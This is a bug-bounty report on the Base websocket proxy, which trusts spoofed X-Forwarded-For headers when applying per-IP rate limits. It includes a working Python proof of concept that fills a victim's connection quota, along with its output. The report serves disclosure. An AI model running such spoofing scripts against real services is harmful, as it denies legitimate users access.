# 74580 bc insight websocket proxy trusts spoofed forwarded ip for rate limits

> Submitted on Apr 23rd 2026 at 15:36:59 UTC by @iam0x04 for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74580
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/base/base/releases/tag/v0.8.0-rc.15>
* **Impacts:**

## Description

## Brief/Intro

The Flashblocks websocket proxy trusts `X-Forwarded-For` unconditionally from every connecting client. Because the per-IP rate limiter keys on this caller-controlled header value, the limit is trivially bypassed by any client malicious or not.

The security control does not function as designed for any direct connection.

## Vulnerability Details

The binary binds publicly by default and sets:

* `listen_addr = 0.0.0.0:8545`
* `instance_connection_limit = 100`
* `per_ip_connection_limit = 10`
* `ip_addr_http_header = X-Forwarded-For`

When a websocket request arrives, `websocket_handler` in `crates/infra/websocket-proxy/src/server.rs:226` derives the rate-limit key:

```rust
// crates/infra/websocket-proxy/src/server.rs:235-237
let client_addr = headers
    .get(state.ip_addr_http_header)
    .map_or(connect_addr, |value| extract_addr(value, connect_addr));
```

`connect_addr` comes from Axum's `ConnectInfo<SocketAddr>` (the real TCP peer), but as soon as the configured header (default `X-Forwarded-For`, wired at `bin/websocket-proxy/src/main.rs:77`) is present, the real peer address is discarded and replaced by whatever the client put in the header.

`extract_addr` at `crates/infra/websocket-proxy/src/server.rs:276` parses the last comma-separated value of that header and returns it verbatim as the client IP:

```rust
// crates/infra/websocket-proxy/src/server.rs:276-289
fn extract_addr(header: &HeaderValue, fallback: IpAddr) -> IpAddr {
    // ... split on ',', take last, parse as IpAddr, else fallback
}
```

There is **no trusted-proxy allowlist** and **no check that the immediate peer is a known load balancer** before consulting the header. The resulting `client_addr` is then passed directly to the rate limiter:

```rust
// crates/infra/websocket-proxy/src/server.rs:239
let ticket = match state.rate_limiter.try_acquire(client_addr) {
```

## Impact Details

### 1. Per-IP limit bypass (self-serving)

Any client can set arbitrary `X-Forwarded-For` values to exceed their own per-IP quota.

### 2. Targeted connection block (victim framing)

An attacker who knows a target's real IP address can open `per_ip_limit` connections with `X-Forwarded-For: <victim IP>`. The rate limiter increments the victim's counter in `active_connections`. When the real victim subsequently connects, their quota is already exhausted and they receive `429 IP limit exceeded`.

## References

<https://github.com/base/base/blob/de349fc9e8bf61531ce36ca57572345b03b2b097/bin/websocket-proxy/src/main.rs#L59-L65>

<https://github.com/base/base/blob/de349fc9e8bf61531ce36ca57572345b03b2b097/crates/infra/websocket-proxy/src/server.rs#L226-L238>

<https://github.com/base/base/blob/de349fc9e8bf61531ce36ca57572345b03b2b097/crates/infra/websocket-proxy/src/server.rs#L276-L296>

## Proof of Concept

{% stepper %}
{% step %}

## 1. mock upstream

```python
import asyncio, websockets

async def h(ws):
    async for _ in ws:
        pass

async def main():
    async with websockets.serve(h, '127.0.0.1', 9999):
        print("mock upstream listening on ws://127.0.0.1:9999")
        await asyncio.Future()  # run forever

asyncio.run(main())
```

{% endstep %}

{% step %}

## 2. Build websocket-proxy (bin/websocket-proxy), and run with reduced limits for fast demo

```bash
RUSTFLAGS="" ./target/debug/websocket-proxy \
  --upstream-ws ws://127.0.0.1:9999 \
  --listen-addr 0.0.0.0:8765 \
  --instance-connection-limit 15 \
  --per-ip-connection-limit 5 \
  --metrics-addr 127.0.0.1:9002
```

{% endstep %}

{% step %}

## 3. run PoC

```python
#!/usr/bin/env python3
import asyncio
import websockets

TARGET = "ws://127.0.0.1:8765/ws"

async def connect(extra_headers=None, label=""):
    try:
        ws = await websockets.connect(TARGET, additional_headers=extra_headers or {})
        return ws, "ACCEPTED"
    except Exception as e:
        code = getattr(getattr(e, 'response', None), 'status_code', None) or str(e)
        return None, f"REJECTED {code}"

async def phase1_normal():
    """Without X-Forwarded-For: per-IP limit of 5 enforced."""
    print("\n=== Phase 1: No X-Forwarded-For (limit should kick in at 6) ===")
    conns = []
    for i in range(8):
        ws, status = await connect()
        print(f"  conn {i+1:>2}: {status}")
        if ws:
            conns.append(ws)
    return conns

async def phase2_bypass():
    """With spoofed X-Forwarded-For: per-IP limit bypassed, fills instance cap."""
    print("\n=== Phase 2: Spoofed X-Forwarded-For (bypass per-IP limit) ===")
    conns = []
    for i in range(16):
        spoofed_ip = f"10.0.0.{i+1}"
        ws, status = await connect(
            extra_headers={"X-Forwarded-For": spoofed_ip},
            label=spoofed_ip,
        )
        print(f"  conn {i+1:>2} (X-Forwarded-For: {spoofed_ip:<12}): {status}")
        if ws:
            conns.append(ws)
    return conns

async def phase3_victim_locked_out(attacker_conns):
    """After attacker fills all 15 slots, legitimate user can't connect."""
    print("\n=== Phase 3: Victim tries to connect after attacker fills instance cap ===")
    ws, status = await connect()
    print(f"  victim conn: {status}")
    print(f"  attacker holds {len(attacker_conns)} connections open")

async def phase4_targeted_block():
    """Attacker spoofs victim's IP to exhaust their per-IP quota.
    Only 5 connections needed to permanently block a specific IP."""
    VICTIM_IP = "203.0.113.42"  # victim's known real IP
    print(f"\n=== Phase 4: Targeted block — exhaust quota for victim IP {VICTIM_IP} ===")

    # Attacker opens per_ip_limit connections pretending to be the victim
    attacker_conns = []
    for i in range(5):
        ws, status = await connect(extra_headers={"X-Forwarded-For": VICTIM_IP})
        print(f"  attacker conn {i+1} (spoofed as {VICTIM_IP}): {status}")
        if ws:
            attacker_conns.append(ws)

    # Now the real victim connects from their actual IP — no X-Forwarded-For
    # The proxy sees their real IP as VICTIM_IP (via X-Forwarded-For trust) — but
    # simulate the victim also being direct: what matters is their quota is spent
    print(f"\n  Victim now tries to connect with X-Forwarded-For: {VICTIM_IP} (their real IP):")
    ws, status = await connect(extra_headers={"X-Forwarded-For": VICTIM_IP})
    print(f"  victim conn: {status}  ← blocked by attacker's 5 connections")

    for ws in attacker_conns:
        await ws.close()
    return attacker_conns

async def main():
    normal_conns = await phase1_normal()
    for ws in normal_conns:
        await ws.close()
    await asyncio.sleep(0.2)

    attacker_conns = await phase2_bypass()
    await phase3_victim_locked_out(attacker_conns)
    for ws in attacker_conns:
        await ws.close()
    await asyncio.sleep(0.2)

    await phase4_targeted_block()

asyncio.run(main())
```

### Observed output

```
=== Phase 1: No X-Forwarded-For (limit should kick in at 6) ===
  conn  1: ACCEPTED
  conn  2: ACCEPTED
  conn  3: ACCEPTED
  conn  4: ACCEPTED
  conn  5: ACCEPTED
  conn  6: REJECTED 429
  conn  7: REJECTED 429
  conn  8: REJECTED 429

=== Phase 2: Spoofed X-Forwarded-For (bypass per-IP limit) ===
  conn  1 (X-Forwarded-For: 10.0.0.1    ): ACCEPTED
  conn  2 (X-Forwarded-For: 10.0.0.2    ): ACCEPTED
  conn  3 (X-Forwarded-For: 10.0.0.3    ): ACCEPTED
  conn  4 (X-Forwarded-For: 10.0.0.4    ): ACCEPTED
  conn  5 (X-Forwarded-For: 10.0.0.5    ): ACCEPTED
  conn  6 (X-Forwarded-For: 10.0.0.6    ): ACCEPTED
  conn  7 (X-Forwarded-For: 10.0.0.7    ): ACCEPTED
  conn  8 (X-Forwarded-For: 10.0.0.8    ): ACCEPTED
  conn  9 (X-Forwarded-For: 10.0.0.9    ): ACCEPTED
  conn 10 (X-Forwarded-For: 10.0.0.10   ): ACCEPTED
  conn 11 (X-Forwarded-For: 10.0.0.11   ): ACCEPTED
  conn 12 (X-Forwarded-For: 10.0.0.12   ): ACCEPTED
  conn 13 (X-Forwarded-For: 10.0.0.13   ): ACCEPTED
  conn 14 (X-Forwarded-For: 10.0.0.14   ): ACCEPTED
  conn 15 (X-Forwarded-For: 10.0.0.15   ): ACCEPTED
  conn 16 (X-Forwarded-For: 10.0.0.16   ): REJECTED 429

=== Phase 3: Victim tries to connect after attacker fills instance cap ===
  victim conn: REJECTED 429
  attacker holds 15 connections open
```

Phase 1 proves the per-IP limit enforces correctly without the header.\
Phase 2 proves one real IP consumes the entire instance cap via spoofed headers.\
Phase 3 proves legitimate users are fully locked out.
{% endstep %}

{% step %}

## 4. target blocked

Phase 1 proves the per-IP limit enforces correctly without the header. Phase 2 proves one real IP consumes the entire instance cap via spoofed headers. Phase 3 proves legitimate users are fully locked out.
{% endstep %}
{% endstepper %}
